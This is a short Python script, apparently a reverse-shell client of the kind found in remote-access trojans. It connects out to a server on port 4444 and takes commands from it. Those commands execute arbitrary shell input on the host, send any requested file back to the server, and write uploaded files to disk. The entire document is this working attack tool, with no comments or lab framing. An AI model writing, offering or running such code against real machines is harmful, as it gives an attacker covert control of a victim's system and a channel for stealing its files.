import socket
import subprocess
import os
import struct

SERVER_IP = "127.0.0.1"
PORT = 4444
BUFFER = 4096


def send_data(sock, data: bytes):
    sock.sendall(struct.pack(">I", len(data)) + data)


def recv_data(sock):
    raw_len = sock.recv(4)
    if not raw_len:
        return None
    length = struct.unpack(">I", raw_len)[0]

    data = b""
    while len(data) < length:
        chunk = sock.recv(BUFFER)
        if not chunk:
            break
        data += chunk
    return data


def send_file(sock, path):
    if not os.path.exists(path):
        send_data(sock, b"ERROR")
        return

    send_data(sock, b"OK")

    with open(path, "rb") as f:
        send_data(sock, f.read())


def receive_file(sock, path):
    status = recv_data(sock)
    if status != b"OK":
        return

    data = recv_data(sock)
    with open(path, "wb") as f:
        f.write(data)


def main():
    s = socket.socket()

    try:
        s.connect((SERVER_IP, PORT))
    except Exception as e:
        print("Connection failed:", e)
        return

    while True:
        data = recv_data(s)

        if not data:
            print("Server disconnected")
            break

        cmd = data.decode(errors="ignore")

        if cmd == "exit":
            break

        parts = cmd.split()

        if parts[0] == "exec":
            result = subprocess.getoutput(" ".join(parts[1:]))
            send_data(s, result.encode())

        elif parts[0] == "download":
            send_file(s, parts[1])

        elif parts[0] == "upload":
            receive_file(s, parts[1])

    s.close()

if __name__ == "__main__":
    main()